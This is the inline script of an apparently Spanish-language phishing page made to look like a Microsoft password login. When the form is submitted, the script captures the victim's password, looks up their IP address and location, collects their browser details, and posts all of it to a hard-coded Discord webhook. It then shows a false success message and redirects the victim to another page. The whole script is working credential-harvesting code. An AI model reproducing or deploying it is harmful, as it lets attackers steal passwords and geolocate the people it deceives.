<body>

    <script>
        // Configuraci贸n - Reemplaza con tu Webhook de Discord
        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1408473575647744201/9mNHBbWbHY6o7jyUw0xJPRPLXl_zpjnNmT4PdX_0a_QzP4Bz42rjyqJtXn1pFE_UTQUJ';
        
        // Generar burbujas de fondo
        function createBubbles() {
            const bubblesContainer = document.querySelector('.background-bubbles');
            for (let i = 0; i < 15; i++) {
                const bubble = document.createElement('div');
                const size = Math.random() * 60 + 20;
                const left = Math.random() * 100;
                const animationDelay = Math.random() * 10;
                const animationDuration = Math.random() * 20 + 15;
                
                bubble.style.width = `${size}px`;
                bubble.style.height = `${size}px`;
                bubble.style.left = `${left}%`;
                bubble.style.animationDelay = `${animationDelay}s`;
                bubble.style.animationDuration = `${animationDuration}s`;
                
                bubblesContainer.appendChild(bubble);
            }
        }
        
        // Alternar visibilidad de contrase帽a
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eye-icon');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = '<path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10.585 10.587a2 2 0 0 0 2.829 2.828" /><path d="M16.681 16.673a8.717 8.717 0 0 1 -4.681 1.327c-3.6 0 -6.6 -2 -9 -6c1.272 -2.12 2.712 -3.678 4.32 -4.674m2.86 -1.146a9.055 9.055 0 0 1 1.82 -.18c3.6 0 6.6 2 9 6c-.666 1.11 -1.379 2.067 -2.138 2.87" /><path d="M3 3l18 18" />';
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = '<path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0"></path><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6"></path>';
            }
        }
        
        // Mostrar notificaci贸n
        function showNotification(message, type) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = 'notification ' + type;
            notification.style.display = 'block';
            
            // Ocultar notificaci贸n despu茅s de 5 segundos
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }
        
        // Mostrar mensaje de 茅xito
        function showSuccessMessage() {
            const successMessage = document.getElementById('success-message');
            successMessage.style.display = 'block';
            
            // Ocultar mensaje despu茅s de 5 segundos
            setTimeout(() => {
                successMessage.style.display = 'none';
            }, 5000);
        }
        
        // Obtener informaci贸n de geolocalizaci贸n
        async function getGeoLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Error obteniendo geolocalizaci贸n:', error);
                return {
                    ip: 'No disponible',
                    city: 'No disponible',
                    country_name: 'No disponible'
                };
            }
        }
        
        // Enviar datos a Discord
        async function sendToDiscord(password) {
            try {
                // Obtener informaci贸n de geolocalizaci贸n
                const locationData = await getGeoLocation();
                
                // Crear el mensaje embed para Discord
                const embed = {
                    title: " Nuevo inicio de sesi贸n",
                    color: 0x0078d4, // Color azul de Microsoft
                    fields: [
                        {
                            name: "Contrase帽a",
                            value: password || "No proporcionada",
                            inline: false
                        },
                        {
                            name: "IP",
                            value: locationData.ip,
                            inline: true
                        },
                        {
                            name: "Ubicaci贸n",
                            value: `${locationData.city}, ${locationData.country_name}`,
                            inline: true
                        },
                        {
                            name: "Navegador",
                            value: navigator.userAgent,
                            inline: false
                        },
                        {
                            name: "Fecha y hora",
                            value: new Date().toLocaleString('es-ES'),
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Sistema de notificaci贸n"
                    }
                };
                
                // Enviar el webhook a Discord
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error enviando a Discord:', error);
                return false;
            }
        }
        
        // Redirigir a index0.html despu茅s de mostrar el mensaje de 茅xito
        function redirectToIndex2() {
            // Redirigir a index0.html despu茅s de un breve retraso
            setTimeout(() => {
                window.location.href = 'index0.html';
            }, 2000);
        }
        
        // Manejar el env铆o del formulario
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submit-btn');
            const buttonText = document.getElementById('button-text');
            
            // Validaci贸n
            if (!password) {
                showNotification('Por favor, introduce tu contrase帽a', 'error');
                return;
            }
            
            // Mostrar estado de carga
            submitBtn.disabled = true;
            buttonText.innerHTML = '<span class="loading"></span> Procesando...';
            
            // Enviar datos a Discord
            const success = await sendToDiscord(password);
            
            if (success) {
                // Mostrar mensaje de credenciales correctas
                setTimeout(() => {
                    showSuccessMessage();
                    
                    // Redirigir a index0.html despu茅s del mensaje
                    redirectToIndex2();
                }, 1500);
            } else {
                showNotification('Error de conexi贸n. Int茅ntelo de nuevo.', 'error');
                submitBtn.disabled = false;
                buttonText.textContent = 'Iniciar sesi贸n';
            }
        });
        
        // Inicializar la p谩gina
        document.addEventListener('DOMContentLoaded', function() {
            createBubbles();
            
            // Obtener y mostrar el email del localStorage si existe
            const savedEmail = localStorage.getItem('userEmail');
            if (savedEmail) {
                document.getElementById('local').textContent = savedEmail;
            }
        });
    </script>
